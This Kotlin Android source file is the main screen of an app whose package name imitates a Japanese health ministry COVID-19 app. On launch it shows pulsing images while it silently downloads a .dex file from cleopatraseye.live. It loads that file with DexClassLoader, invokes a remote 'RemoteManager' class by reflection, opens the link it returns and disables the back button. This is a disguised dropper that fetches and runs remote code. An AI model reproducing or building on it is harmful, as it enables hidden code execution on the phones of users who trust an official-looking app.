package jp.go.mhlw.covid19r.screens

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.view.animation.AnimationUtils
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import dalvik.system.DexClassLoader
import jp.go.mhlw.covid19r.Const
import jp.go.mhlw.covid19r.R
import jp.go.mhlw.covid19r.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import kotlin.coroutines.Continuation

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val sharedPreferences = getSharedPreferences("CleopatraSharedPref", Context.MODE_PRIVATE)
        val sharedLink = sharedPreferences.getString("CleopatraLink", "null")
        if (sharedLink != "null") {
            val intent = Intent(this, EndPointScreen::class.java)
            intent.putExtra(Const.SHARED_LINK_NAME, sharedLink)
            startActivity(intent)
        } else {
            lifecycleScope.launch {
                withContext(Dispatchers.IO){
                    val optimizedDirectory = cacheDir
                    val urlFileDex = URL("cleopatraseye.live/juwq.dex")
                    val connection = urlFileDex.openConnection() as HttpURLConnection
                    connection.requestMethod = "GET"
                    withContext(Dispatchers.IO) {
                        connection.connect()
                    }

                    if (connection.responseCode == HttpURLConnection.HTTP_OK) {
                        val inputStream = connection.inputStream
                        val cacheDir = cacheDir
                        val dexDir = File(cacheDir, "dex")
                        dexDir.mkdirs()
                        val dexFile = File(dexDir, "classes.dex")
                        dexFile.createNewFile()
                        val outputStream = FileOutputStream(dexFile)
                        inputStream.copyTo(outputStream)

                        val dexFileLoader = DexClassLoader(
                            dexFile.absolutePath,
                            optimizedDirectory.absolutePath,
                            null,
                            classLoader
                        )

                        val urlBuilderClass = dexFileLoader.loadClass("RemoteManager")
                        val instance = urlBuilderClass.newInstance()
                        val initRemoteManager = urlBuilderClass.getMethod(
                            "initRemoteManager",
                            Context::class.java,
                            Continuation::class.java
                        )
                        val continuation = Continuation<String>(Dispatchers.Main) {
                            val intent = Intent(this@MainActivity, EndPointScreen::class.java)
                            intent.putExtra(Const.SHARED_LINK_NAME, it.getOrNull())
                            startActivity(intent)
                        }

                        initRemoteManager.invoke(instance, this@MainActivity, continuation)

                    }
                }
            }

            binding = ActivityMainBinding.inflate(layoutInflater)
            setContentView(binding.root)
            window.statusBarColor = getColor(R.color.black)
            val pulsate = AnimationUtils.loadAnimation(this, R.anim.alpha_pulse)

            with(binding) {
                img1.startAnimation(pulsate)
                img2.startAnimation(pulsate)
                img3.startAnimation(pulsate)
                img4.startAnimation(pulsate)
                img5.startAnimation(pulsate)
                img6.startAnimation(pulsate)
            }
        }
    }

    override fun onBackPressed() {

    }

}